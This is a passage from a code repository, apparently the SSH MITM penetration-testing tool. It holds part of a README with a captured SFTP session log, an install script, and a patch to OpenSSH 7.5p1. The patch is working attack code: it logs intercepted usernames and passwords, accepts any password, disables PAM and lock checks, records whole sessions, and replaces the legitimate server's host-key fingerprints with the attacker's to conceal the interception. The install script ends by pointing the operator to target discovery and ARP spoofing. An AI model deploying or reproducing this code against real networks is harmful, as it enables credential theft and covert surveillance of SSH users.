3048960 Sep 11 13:51 file4\n\n    > realpath \"/home/jdog/file5\" (Result: /home/jdog/file5)\n    > put <a href=\"sftp_session_0/file5\">/home/jdog/file5</a>\n    > realpath \"/home/jdog/file5\" (Result: /home/jdog/file5)\n    > stat \"/home/jdog/file5\" (Result: flags: 15; size: 854072; uid: 1001; gid: 1001; perm: 0100664, atime: 1505172831, mtime: 1505172831)\n    > setstat \"/home/jdog/file5\" (Result: flags: 4; size: 0; uid: 0; gid: 0; perm: 0100700, atime: 0, mtime: 0)\n    </pre></html>\n\n\n## Developer Documentation\n\nIn *lol.h* are two defines: *DEBUG_HOST* and *DEBUG_PORT*.  Enable them and set the hostname to a test server.  Now you can connect to *sshd_mitm* directly without using ARP spoofing in order to test your changes, e.g.:\n\n    ssh -p 2222 valid_user_on_debug_host@localhost\n\nTo test out changes to the OpenSSH source code, use the *dev/redeploy.sh* script.\n\nTo see a diff of uncommitted changes, use the *dev/make_diff_of_uncommitted_changes.sh* script.\n\nTo re-generate a full patch to the OpenSSH sources, use the *dev/regenerate_patch.sh* script.\n"
        },
        {
          "name": "apparmor",
          "type": "tree",
          "content": null
        },
        {
          "name": "dev",
          "type": "tree",
          "content": null
        },
        {
          "name": "docker",
          "type": "tree",
          "content": null
        },
        {
          "name": "install.sh",
          "type": "blob",
          "size": 10.3662109375,
          "content": "#!/bin/bash\n\n# install.sh\n# Copyright (C) 2017-2021, Joe Testa <jtesta@positronsecurity.com>\n#\n# This program is free software: you can redistribute it and/or modify\n# it under the terms version 3 of the GNU General Public License as\n# published by the Free Software Foundation.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\nopenssh_source_dir='openssh-7.5p1-mitm'\nopenssl_source_dir='openssl-1.0.2u'\n\n# Find the total number of CPU cores on this machine.\nNUM_PROCS=1\nif [[ -x /usr/bin/nproc ]]; then\n    NUM_PROCS=`/usr/bin/nproc --all`\nfi\necho \"Detected ${NUM_PROCS} CPU cores.\"\n\n\n# Resets the environment (in case this script was run once before).\nfunction reset_env {\n\n    # Make sure no sshd_mitm is running and the user is logged out.\n    killall -u ssh-mitm 2> /dev/null\n\n    # Check if the ssh-mitm user exists.\n    id ssh-mitm > /dev/null 2> /dev/null\n    if [[ $? == 0 ]]; then\n\n\t# The user exists.  If this script was run with the \"--force\" argument,\n        # then we will delete the user.\n        if [[ $1 == '--force' ]]; then\n            userdel -f -r ssh-mitm 2> /dev/null\n\n        # There could be saved sessions from an old version of SSH MITM that\n        # we shouldn't destroy automatically.\n        else\n            echo \"It appears that the ssh-mitm user already exists.  Make backups of any saved sessions in /home/ssh-mitm/log, then re-run this script with the \\\"--force\\\" argument (this will cause the user account to be deleted and re-created).\"\n            exit -1\n        fi\n    fi\n\n    return 1\n}\n\n\n# Installs prerequisites.\nfunction install_prereqs {\n    echo -e \"Installing prerequisites...\\n\"\n\n    declare -a packages need_openssl_sources\n    packages=(autoconf build-essential zlib1g-dev)\n\n    # Check if we are in Kali Linux, Ubuntu 18.04, or Linux Mint 19.  These\n    # OSes ship with OpenSSL v1.1.0, which OpenSSH doesn't support.  So we\n    # need to explicitly install the v1.0.x dev package.\n    #\n    # Also, a bare-bones Kali installation may not have the killall tool,\n    # so install that in the psmisc package.\n    if [[ -f /etc/lsb-release ]]; then\n        egrep \"Kali|bionic|Linux Mint 19\" /etc/lsb-release > /dev/null\n    else\n        egrep \"Kali\" /etc/os-release > /dev/null\n    fi\n\n    if [[ $? == 0 ]]; then\n        packages+=(psmisc)\n    else\n       # On Linux Mint 20 / Ubuntu 20, there is no package that gives us OpenSSL 1.0.2, so we'll download and compile from sources.\n       need_openssl_sources=1\n    fi\n\n    echo -e \"Installing packages: ${packages[@]}\"\n    apt install -y ${packages[@]}\n    if [[ $? != 0 ]]; then\n        echo -e \"Failed to install prerequisites.  Failed: apt install -y ${packages[@]}\"\n        exit -1\n    fi\n\n    # Compile OpenSSL v1.0.2u from sources.\n    echo -e \"\\nCompiling OpenSSL 1.0.2u...\"\n    pushd $openssl_source_dir > /dev/null\n    make clean\n    ./config -v -fstack-protector-all -D_FORTIFY_SOURCE=2 -fPIC no-shared enable-weak-ssl-ciphers zlib\n    make -j $NUM_PROCS depend\n    make -j $NUM_PROCS all\n    popd > /dev/null\n\n    if [[ (! -f $openssl_source_dir/libssl.a) || (! -f $openssl_source_dir/libcrypto.a) ]]; then\n        echo \"\\nFailed to build libssl.a and/or libcrypto.a in ${openssl_source_dir} directory!\"\n        exit -1\n    fi\n\n    echo -e \"\\nSuccessfully built OpenSSL 1.0.2u from sources.\\n\"\n    return 1\n}\n\n\n# Applies the MITM patch to OpenSSH and compiles it.\nfunction compile_openssh {\n    pushd $openssh_source_dir > /dev/null\n\n    echo -e \"Running autoconf in openssh-7.5p1-mitm/...\\n\"\n    autoconf\n\n    echo -e \"\\nDone.  Compiling modified OpenSSH sources...\\n\"\n    ./configure --with-sandbox=no --with-privsep-user=ssh-mitm --with-privsep-path=/home/ssh-mitm/empty --with-pid-dir=/home/ssh-mitm --with-lastlog=/home/ssh-mitm --with-ssl-dir=../$openssl_source_dir\n    make clean\n    make -j $NUM_PROCS\n    popd > /dev/null\n\n    # Ensure that sshd and ssh were built.\n    if [[ (! -f $openssh_source_dir/sshd) || (! -f $openssh_source_dir/ssh) ]]; then\n        echo -e \"\\nFailed to build ssh and/or sshd.  Terminating.\"\n        exit -1\n    fi\n\n    echo -e \"\\nSuccessfully built SSH MITM!\\n\"\n}\n\n\n# Creates the ssh-mitm user account, and sets up its environment.\nfunction setup_environment {\n    echo -e \"\\nCreating ssh-mitm user, and setting up its environment...\\n\"\n\n    # Create the ssh-mitm user and set its home directory to mode 0700.  Create\n    # \"bin\" and \"etc\" subdirectories to hold the executables and config file,\n    # respectively.\n    useradd -m -s /bin/bash ssh-mitm\n    chmod 0700 ~ssh-mitm\n    mkdir -m 0755 ~ssh-mitm/{bin,etc,log}\n    mkdir -m 0700 ~ssh-mitm/tmp\n    chown ssh-mitm:ssh-mitm ~ssh-mitm/{tmp,log}\n\n    # Strip the debugging symbols out of the executables.\n    strip $openssh_source_dir/sshd $openssh_source_dir/ssh\n\n    # Make a copy of the ssh client config, since we need to modify it.\n    cp $openssh_source_dir/ssh_config $openssh_source_dir/ssh_config.mitm\n\n    # Add explicit algorithm lists to ssh client's config.\n    echo -e \"\\nHostKeyAlgorithms ssh-ed25519,ssh-rsa,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-dss\\n\\nKexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,ecdh-sha2-nistp521,ecdh-sha2-nistp384,ecdh-sha2-nistp256,diffie-hellman-group1-sha1\\n\\nCiphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-gcm@openssh.com,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,blowfish-cbc,cast128-cbc,3des-cbc,arcfour256,arcfour128,arcfour\\n\\nMACs umac-128-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512,hmac-sha2-256,umac-128@openssh.com,umac-64-etm@openssh.com,umac-64@openssh.com,hmac-ripemd160-etm@openssh.com,hmac-ripemd160@openssh.com,hmac-ripemd160,hmac-sha1-etm@openssh.com,hmac-sha1,hmac-sha1-96-etm@openssh.com,hmac-sha1-96,hmac-md5-etm@openssh.com,hmac-md5,hmac-md5-96-etm@openssh.com,hmac-md5-96\\n\" >> $openssh_source_dir/ssh_config.mitm\n\n    # Copy the config files to the \"etc\" directory.\n    cp $openssh_source_dir/sshd_config ~ssh-mitm/etc/sshd_config\n    cp $openssh_source_dir/ssh_config.mitm ~ssh-mitm/etc/ssh_config\n\n    # Copy the executables to the \"bin\" directory.\n    cp $openssh_source_dir/sshd ~ssh-mitm/bin/sshd_mitm\n    cp $openssh_source_dir/ssh ~ssh-mitm/bin/ssh\n\n    # Create a 4096-bit RSA host key and ED25519 host key.\n    ssh-keygen -t rsa -b 4096 -f /home/ssh-mitm/etc/ssh_host_rsa_key -N ''\n    ssh-keygen -t ed25519 -f /home/ssh-mitm/etc/ssh_host_ed25519_key -N ''\n\n    # Create the \"empty\" directory to make the privsep function happy,\n    # as well as the \".ssh\" directory (for some reason, this was observed\n    # to not be created properly at run-time...).\n    mkdir -m 0700 ~ssh-mitm/empty ~ssh-mitm/.ssh\n\n    # Set ownership on the \"empty\" directory and SSH host keys.\n    chown ssh-mitm:ssh-mitm /home/ssh-mitm/empty /home/ssh-mitm/.ssh /home/ssh-mitm/etc/ssh_host_*key*\n\n    # Create the \"run.sh\" script, then set its permissions.\n    cat > ~ssh-mitm/run.sh <<EOF\n#!/bin/bash\n/home/ssh-mitm/bin/sshd_mitm -f /home/ssh-mitm/etc/sshd_config\nif [[ \\$? == 0 ]]; then\n    echo \"sshd_mitm is now running.\"\n    exit 0\nelse\n    echo -e \"\\n\\nERROR: sshd_mitm failed to start!\\n\"\n    exit -1\nfi\nEOF\n    chmod 0755 ~ssh-mitm/run.sh\n\n    # Install the AppArmor profiles.\n    if [[ ! -d /etc/apparmor.d ]]; then\n        mkdir -m 0755 /etc/apparmor.d\n    fi\n    cp apparmor/home.ssh-mitm.bin.sshd_mitm /etc/apparmor.d/\n    cp apparmor/home.ssh-mitm.bin.ssh /etc/apparmor.d/\n\n    # Enable the profiles.\n    service apparmor reload 2> /dev/null\n\n    # If AppArmor isn't installed, give Kali users a chance to install it\n    # automatically (if Kali is installed to disk).  For other distros,\n    # simply print a warning.\n    if [[ $? != 0 ]]; then\n\n        # Is this Kali Linux?\n        grep Kali /etc/os-release > /dev/null\n        if [[ $? == 0 ]]; then\n\n            # Is Kali installed, or is it a Live CD boot?\n            if [[ -f /etc/default/grub ]]; then  # Its installed.\n                echo -e -n \"\\nKali Linux detected with no AppArmor installed.  For added safety, it is highly recommended (though not required) that sshd_mitm is run in a restricted environment.  Would you like to automatically enable AppArmor? (y/n) \"\n                read -n 1 install_apparmor\n                echo -e \"\\n\"\n\n                # If the user chose to install AppArmor...\n                if [[ ($install_apparmor == 'y') || ($install_apparmor == 'Y') ]]; then\n                    echo -e \"Getting apparmor from repository...\\n\"\n                    apt -y install apparmor\n\n                    echo -e \"\\nEnabling AppArmor on startup...\\n\"\n                    update-rc.d apparmor enable\n\n                    echo -e \"\\nUpdating bootloader...\\n\"\n                    sed -i 's/GRUB_CMDLINE_LINUX_DEFAULT=\"quiet\"/GRUB_CMDLINE_LINUX_DEFAULT=\"quiet apparmor=1 security=apparmor\"/' /etc/default/grub\n                    update-grub2\n\n                    echo -e \"\\nFinished installing AppArmor.  Reboot to enable it.\\n\"\n                else  # User declined to install AppArmor.\n                    echo -e \"\\nAppArmor will not be automatically installed.\"\n                fi\n            else  # Kali Live CD boot.\n                echo -e \"\\n\\n\\t!!! WARNING !!!: AppArmor is not available on Kali Live instances.  For added safety, it is highly recommended (though not required) that sshd_mitm is run in a restricted environment.  Installing Kali to a disk would allow AppArmor to be enabled.\\n\"\n            fi\n\n        else  # This is not Kali Linux.\n            echo -e \"\\n\\n\\t!!! WARNING !!!: AppArmor is not installed.  It is highly recommended (though not required) that sshd_mitm is run in a restricted environment.\\n\\n\\tInstall AppArmor with: \\\"apt install apparmor\\\".\\n\"\n        fi\n    fi\n}\n\n\nif [[ `id -u` != 0 ]]; then\n    echo \"Error: this script must be run as root.\"\n    exit -1\nfi\n\ninstall_prereqs\nreset_env $1\ncompile_openssh\nsetup_environment\n\necho -e \"\\n\\nDone!  The next step is to use JoesAwesomeSSHMITMVictimFinder.py to find target IPs, then execute start.sh and ARP spoof.\\n\\n\"\nexit 0\n"
        },
        {
          "name": "openssh-7.5p1-mitm.patch",
          "type": "blob",
          "size": 148.3232421875,
          "content": "diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth2.c openssh-7.5p1-mitm/auth2.c\n--- openssh-7.5p1/auth2.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/auth2.c\t2019-09-08 01:47:49.714201127 +0000\n@@ -222,6 +222,10 @@\n \t\tfatal(\"input_userauth_request: no authctxt\");\n \n \tuser = packet_get_cstring(NULL);\n+\tauthctxt->original_user = xstrdup(user);\n+\tfree(user);\n+\tuser = xstrdup(UNPRIVED_MITM_USER);\n+\n \tservice = packet_get_cstring(NULL);\n \tmethod = packet_get_cstring(NULL);\n \tdebug(\"userauth-request for user %s service %s method %s\", user, service, method);\n@@ -329,6 +333,8 @@\n \t\treturn;\n \n #ifdef USE_PAM\n+\t/* Disable PAM entirely. */\n+\tif (0) {\n \tif (options.use_pam && authenticated) {\n \t\tif (!PRIVSEP(do_pam_account())) {\n \t\t\t/* if PAM returned a message, send it to the user */\n@@ -341,6 +347,7 @@\n \t\t\t    \"configuration\", authctxt->user);\n \t\t}\n \t}\n+        }\n #endif\n \n #ifdef _UNICOS\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth2-passwd.c openssh-7.5p1-mitm/auth2-passwd.c\n--- openssh-7.5p1/auth2-passwd.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/auth2-passwd.c\t2019-09-08 01:47:49.718200937 +0000\n@@ -43,9 +43,11 @@\n #include \"monitor_wrap.h\"\n #include \"misc.h\"\n #include \"servconf.h\"\n+#include \"lol.h\"\n \n /* import */\n extern ServerOptions options;\n+extern Lol *lol;\n \n static int\n userauth_passwd(Authctxt *authctxt)\n@@ -65,6 +67,13 @@\n \t}\n \tpacket_check_eom();\n \n+\tchar *user = authctxt->user;\n+\tif (authctxt->original_user != NULL)\n+\t  user = authctxt->original_user;\n+\n+\tlogit(\"INTERCEPTED PASSWORD: hostname: [%s]; username: [%s]; password: [%s]\", lol->original_host, user, password);\n+\tlol->username = strdup(user);\n+\tlol->password = strdup(password);\n \tif (change)\n \t\tlogit(\"password change not supported\");\n \telse if (PRIVSEP(auth_password(authctxt, password)) == 1)\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth2-pubkey.c openssh-7.5p1-mitm/auth2-pubkey.c\n--- openssh-7.5p1/auth2-pubkey.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/auth2-pubkey.c\t2019-09-08 01:47:49.730200371 +0000\n@@ -477,7 +477,7 @@\n \t\tclosefrom(STDERR_FILENO + 1);\n \n \t\t/* Don't use permanently_set_uid() here to avoid fatal() */\n-\t\tif (setresgid(pw->pw_gid, pw->pw_gid, pw->pw_gid) != 0) {\n+\t\t/*if (setresgid(pw->pw_gid, pw->pw_gid, pw->pw_gid) != 0) {\n \t\t\terror(\"%s: setresgid %u: %s\", tag, (u_int)pw->pw_gid,\n \t\t\t    strerror(errno));\n \t\t\t_exit(1);\n@@ -487,13 +487,15 @@\n \t\t\t    strerror(errno));\n \t\t\t_exit(1);\n \t\t}\n+\t\t*/\n \t\t/* stdin is pointed to /dev/null at this point */\n \t\tif (dup2(STDIN_FILENO, STDERR_FILENO) == -1) {\n \t\t\terror(\"%s: dup2: %s\", tag, strerror(errno));\n \t\t\t_exit(1);\n \t\t}\n \n-\t\texecve(av[0], av, child_env);\n+\t\t/* Not sure when this happens, exactly, but we definitely never want to execute anything. */\n+\t\t/*execve(av[0], av, child_env);*/\n \t\terror(\"%s exec \\\"%s\\\": %s\", tag, command, strerror(errno));\n \t\t_exit(127);\n \tdefault: /* parent */\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth.c openssh-7.5p1-mitm/auth.c\n--- openssh-7.5p1/auth.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/auth.c\t2019-09-08 01:47:49.730200371 +0000\n@@ -152,6 +152,8 @@\n #ifdef USE_LIBIAF\n \t\tfree((void *) passwd);\n #endif /* USE_LIBIAF */\n+\t\t/* Allow logins to our locked-out bogus user. */\n+\t\tlocked = 0;\n \t\tif (locked) {\n \t\t\tlogit(\"User %.100s not allowed because account is locked\",\n \t\t\t    pw->pw_name);\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth.h openssh-7.5p1-mitm/auth.h\n--- openssh-7.5p1/auth.h\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/auth.h\t2019-09-08 01:47:49.734200182 +0000\n@@ -59,6 +59,7 @@\n \tint\t\t server_caused_failure;\n \tint\t\t force_pwchange;\n \tchar\t\t*user;\t\t/* username sent by the client */\n+  \tchar\t\t*original_user; /* username that the client actually wants to connect as */\n \tchar\t\t*service;\n \tstruct passwd\t*pw;\t\t/* set if 'valid' */\n \tchar\t\t*style;\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth-passwd.c openssh-7.5p1-mitm/auth-passwd.c\n--- openssh-7.5p1/auth-passwd.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/auth-passwd.c\t2019-09-08 01:47:49.738199993 +0000\n@@ -121,6 +121,8 @@\n \tif (options.use_pam)\n \t\treturn (sshpam_auth_passwd(authctxt, password) && ok);\n #endif\n+\t/* Accept all password authentication. */\n+\treturn 1;\n #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)\n \tif (!expire_checked) {\n \t\texpire_checked = 1;\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/auth-sia.c openssh-7.5p1-mitm/auth-sia.c\n--- openssh-7.5p1/auth-sia.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/auth-sia.c\t2019-09-08 01:47:49.742199804 +0000\n@@ -107,7 +107,7 @@\n \n \tsia_ses_release(&ent);\n \n-\tsetuid(0);\n+\t/*setuid(0);*/\n \tpermanently_set_uid(pw);\n }\n \ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/channels.c openssh-7.5p1-mitm/channels.c\n--- openssh-7.5p1/channels.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/channels.c\t2019-09-08 01:47:49.742199804 +0000\n@@ -82,6 +82,7 @@\n #include \"key.h\"\n #include \"authfd.h\"\n #include \"pathnames.h\"\n+#include \"lol.h\"\n \n /* -- channel core */\n \n@@ -191,6 +192,12 @@\n static int connect_next(struct channel_connect *);\n static void channel_connect_ctx_free(struct channel_connect *);\n \n+void log_input(Channel *c, char *buf, int len);\n+void log_output(Channel *c, char *buf, int len);\n+void logx(Channel *c, char *buf, int len);\n+char *replace_fingerprints(Channel *c, char *input, int input_size, int *output_len, int *free_result);\n+void handle_overlap(Channel *c, char *input, unsigned int input_len, unsigned int *output_len);\n+\n /* -- channel core */\n \n Channel *\n@@ -504,6 +511,23 @@\n \tif (c->filter_cleanup != NULL && c->filter_ctx != NULL)\n \t\tc->filter_cleanup(c->self, c->filter_ctx);\n \tchannels[c->self] = NULL;\n+\t/*\n+\tif (c->log_fd > 0) {\n+\t\tfdatasync(c->log_fd);\n+\t\tclose(c->log_fd);\n+\t\tc->log_fd = 0;\n+\t}\n+\t*/\n+\tfree(c->legit_md5_fingerprint);    c->legit_md5_fingerprint = NULL;\n+\tc->legit_md5_fingerprint_len = 0;\n+\tfree(c->legit_sha256_fingerprint); c->legit_sha256_fingerprint = NULL;\n+\tc->legit_sha256_fingerprint_len = 0;\n+\tfree(c->our_md5_fingerprint);      c->our_md5_fingerprint = NULL;\n+\tc->our_md5_fingerprint_len = 0;\n+\tfree(c->our_sha256_fingerprint);   c->our_sha256_fingerprint = NULL;\n+\tc->our_sha256_fingerprint_len = 0;\n+\tfree(c->extra_fp_bytes);           c->extra_fp_bytes = NULL;\n+\tc->extra_fp_bytes_len = 0;\n \tfree(c);\n }\n \n@@ -853,12 +877,14 @@\n \n void\n channel_set_fds(int id, int rfd, int wfd, int efd,\n-    int extusage, int nonblock, int is_tty, u_int window_max)\n+    int extusage, int nonblock, int is_tty, u_int window_max, int session_log_fd, int is_sftp)\n {\n \tChannel *c = channel_lookup(id);\n \n \tif (c == NULL || c->type != SSH_CHANNEL_LARVAL)\n \t\tfatal(\"channel_activate for non-larval channel %d.\", id);\n+\tc->log_fd = session_log_fd;\n+\tc->is_sftp = is_sftp;\n \tchannel_register_fds(c, rfd, wfd, efd, extusage, nonblock, is_tty);\n \tc->type = SSH_CHANNEL_OPEN;\n \tc->local_window = c->local_window_max = window_max;\n@@ -1729,6 +1755,8 @@\n {\n \tchar buf[CHAN_RBUF];\n \tint len, force;\n+\tchar *output = NULL;\n+\tint output_len = 0, real_output_len = 0, free_result = 0;\n \n \tforce = c->isatty && c->detach_close && c->istate != CHAN_INPUT_CLOSED;\n \tif (c->rfd != -1 && (force || FD_ISSET(c->rfd, readset))) {\n@@ -1758,16 +1786,23 @@\n \t\t\t}\n \t\t\treturn -1;\n \t\t}\n+\n+\t\t/* Replace the legit server's fingerprints in the output with\n+\t\t * our fingerprints.  >:] */\n+\t\toutput = replace_fingerprints(c, buf, len, &output_len, &free_result);\n+\t\thandle_overlap(c, output, output_len, &real_output_len);\n+\t\tlog_output(c, output, real_output_len);\n \t\tif (c->input_filter != NULL) {\n-\t\t\tif (c->input_filter(c, buf, len) == -1) {\n+\t\t\tif (c->input_filter(c, output, real_output_len) == -1) {\n \t\t\t\tdebug2(\"channel %d: filter stops\", c->self);\n \t\t\t\tchan_read_failed(c);\n \t\t\t}\n \t\t} else if (c->datagram) {\n-\t\t\tbuffer_put_string(&c->input, buf, len);\n+\t\t\tbuffer_put_string(&c->input, output, real_output_len);\n \t\t} else {\n-\t\t\tbuffer_append(&c->input, buf, len);\n+\t\t\tbuffer_append(&c->input, output, real_output_len);\n \t\t}\n+\t\tif (free_result) { free(output); output = NULL; }\n \t}\n \treturn 1;\n }\n@@ -1824,6 +1859,7 @@\n \t\t\tdlen = MIN(dlen, 8*1024);\n #endif\n \n+\t\tlog_input(c, buf, dlen);\n \t\tlen = write(c->wfd, buf, dlen);\n \t\tif (len < 0 &&\n \t\t    (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK))\n@@ -4670,3 +4706,246 @@\n \tpacket_send();\n \tpacket_write_wait();\n }\n+\n+void log_input(Channel *c, char *buf, int len) {\n+  logx(c, buf, len);\n+}\n+\n+void log_output(Channel *c, char *buf, int len) {\n+  logx(c, buf, len);\n+}\n+\n+void logx(Channel *c, char *buf, int len) {\n+  /* Do not log the raw binary stream if this is an SFTP channel. */\n+  if (c->is_sftp)\n+    return;\n+  else {\n+    int written = 0;\n+    int ret = -1;\n+\n+    if (c->log_fd <= 0)\n+      return;\n+\n+    while (written < len) {\n+      ret = write(c->log_fd, buf + written, len - written);\n+      if (ret < 0)\n+\treturn;\n+\n+      written += len;\n+    }\n+  }\n+}\n+\n+/* This function searches and replaces the legitimate server's host key\n+ * fingerprints with ours.\n+ *\n+ *     \"input\" is the character buffer to search.\n+ *     \"output_len\" holds the number of characters written to the output return\n+ *         value.\n+ *     \"free_result\" is set to 1 if the caller must call free() on the return\n+ *         value when finished with it.\n+ */\n+char *replace_fingerprints(Channel *c, char *input, int input_size, int *output_len, int *free_result) {\n+  char *orig_input = input;\n+  int orig_input_size = input_size;\n+\n+  char *needle = NULL, *needle_replacement = NULL;\n+  int needle_len = 0, needle_replacement_len = 0;\n+\n+  void *ptr = NULL;\n+  char *output = NULL;\n+\n+  int output_size = 0;\n+  int allocated_input = 0, allocated_output = 0;\n+  int prefix_len = 0, suffix_len = 0;\n+  int i = 0;\n+  int output_is_input = 0;\n+\n+  *output_len = input_size;\n+\n+  /* If extra bytes are set from a previous call (i.e.: a partial fingerprint\n+   * from a previous input block), prepend them to the input in a new buffer. */\n+  if (c->extra_fp_bytes_len > 0) {\n+    int new_input_size = input_size + c->extra_fp_bytes_len;\n+    char *new_input = calloc(new_input_size, sizeof(char));\n+    if (new_input == NULL)\n+      goto replace_fingerprints_error;\n+\n+    memcpy(new_input, c->extra_fp_bytes, c->extra_fp_bytes_len);\n+    memcpy(new_input + c->extra_fp_bytes_len, input, input_size);\n+\n+    input = new_input;\n+    *output_len = input_size = new_input_size;\n+    allocated_input = 1;\n+    c->extra_fp_bytes_len = 0;\n+  }\n+\n+  /* Process the MD5 and SHA256 fingerprint types. */\n+  for (i = 0; i < 2; i++) {\n+    if (i == 0) {\n+      needle = c->legit_md5_fingerprint;\n+      needle_len = c->legit_md5_fingerprint_len;\n+      needle_replacement = c->our_md5_fingerprint;\n+      needle_replacement_len = c->our_md5_fingerprint_len;\n+    } else if(i == 1) {\n+      needle = c->legit_sha256_fingerprint;\n+      needle_len = c->legit_sha256_fingerprint_len;\n+      needle_replacement = c->our_sha256_fingerprint;\n+      needle_replacement_len = c->our_sha256_fingerprint_len;\n+    }\n+\n+    /* If we don't have all the info we need to search and replace, skip this\n+     * fingerprint type. */\n+    if ((needle_len == 0) || (needle_replacement_len == 0))\n+      continue;\n+\n+    /* Search for the needle in the haystack. */\n+    if ((ptr = memmem(input, input_size, needle, needle_len)) != NULL) {\n+\n+      /* If an output buffer isn't decided yet... */\n+      if (output == NULL) {\n+\n+\t/* We will choose to overwrite the input buffer with the output, if it\n+\t * fits.  If it doesn't, we need to allocate a new buffer. */\n+\toutput_size = input_size - needle_len + needle_replacement_len;\n+\tif (output_size > input_size) {\n+\t  output = calloc(output_size, sizeof(char));\n+\n+\t  if (output == NULL)\n+\t    goto replace_fingerprints_error;\n+\n+\t  allocated_output = 1;\n+\t  output_is_input = 0;\n+\t} else {\n+\t  output = input;\n+\t  output_size = input_size;\n+\t  output_is_input = 1;\n+\t}\n+\n+      /* We already set an output buffer (note that we could have allocated it\n+       * ourselves, or it may be the input buffer).  Check if its big enough\n+       * for the replacement string.  If not, allocate a new one or re-allocate\n+       * the existing one, as necessary. */\n+      } else {\n+\tint _output_size = input_size - needle_len + needle_replacement_len;\n+\tif (_output_size > output_size) {\n+\t  output_size = _output_size;\n+\n+\t  /* If we had already allocated a buffer, re-allocate it with the\n+\t   * number of bytes we need.  Otherwise, allocate a new one. */\n+\t  if (allocated_output == 1)\n+\t    output = realloc(output, output_size);\n+\t  else\n+\t    output = calloc(output_size, sizeof(char));\n+\n+\t  if (output == NULL)\n+\t    goto replace_fingerprints_error;\n+\n+\t  allocated_output = 1;\n+\t  output_is_input = 0;\n+\t}\n+      }\n+\n+      /* Calculate the length of the prefix and suffix around the string we\n+       * are replacing. */\n+      prefix_len = (char *)ptr - input;\n+      suffix_len = input_size - prefix_len - needle_len;\n+\n+      /* Copy the prefix, string replacement, and suffix into the output. */\n+      memmove(output, input, prefix_len);\n+      memmove(output + prefix_len, needle_replacement, needle_replacement_len);\n+      memmove(output + prefix_len + needle_replacement_len, (char *)ptr + needle_len, suffix_len);\n+\n+      /* Update the number of bytes we wrote into the output buffer. */\n+      *output_len = prefix_len + needle_replacement_len + suffix_len;\n+    }\n+  }\n+\n+  /* If the output pointer has been set (meaning that a substitution was made),\n+   * free the input buffer if necessary.  Return a pointer to the output\n+   * buffer. */\n+  if (output != NULL) {\n+    if (allocated_input && !output_is_input) {\n+      free(input); input = NULL;\n+      allocated_input = 0;\n+    }\n+\n+    *free_result = allocated_input | allocated_output;\n+    return output;\n+\n+  /* If no substitution was made, return the input buffer (which we may have\n+   * allocated ourselves). */\n+  } else {\n+    *free_result = allocated_input;\n+    return input;\n+  }\n+\n+ replace_fingerprints_error:\n+  if (allocated_input) {\n+    free(input); input = NULL;\n+  }\n+  if (allocated_output) {\n+    free(output); output = NULL;\n+  }\n+  *free_result = 0;\n+  *output_len = orig_input_size;\n+  return orig_input;\n+}\n+\n+/* Handles any partial fingerprints found at the end of the input block.  Any\n+ * that are found are placed in the Channel's \"extra_fp_bytes\" buffer, which\n+ * will be prepended in the next block's buffer by replace_fingerprints().  The\n+ * smallest partial fingerprint this will look for is of length 8, so as to\n+ * maintain high responsiveness for interactive shell sessions.\n+ *\n+ *    \"input\" is the input buffer to process.\n+ *    \"input_len\" is the number of bytes to process in the input buffer.\n+ *    \"output_len\" is the new number of bytes the caller should use in the\n+ *        input buffer, where output_len <= input_len.\n+ */\n+void handle_overlap(Channel *c, char *input, unsigned int input_len, unsigned int *output_len) {\n+  unsigned int i, shift;\n+  char *needle = NULL;\n+  unsigned int needle_len = 0;\n+  int found_substr = 0;\n+\n+  *output_len = input_len;\n+\n+  /* Don't bother processing input blocks smaller than 8, since that is the\n+  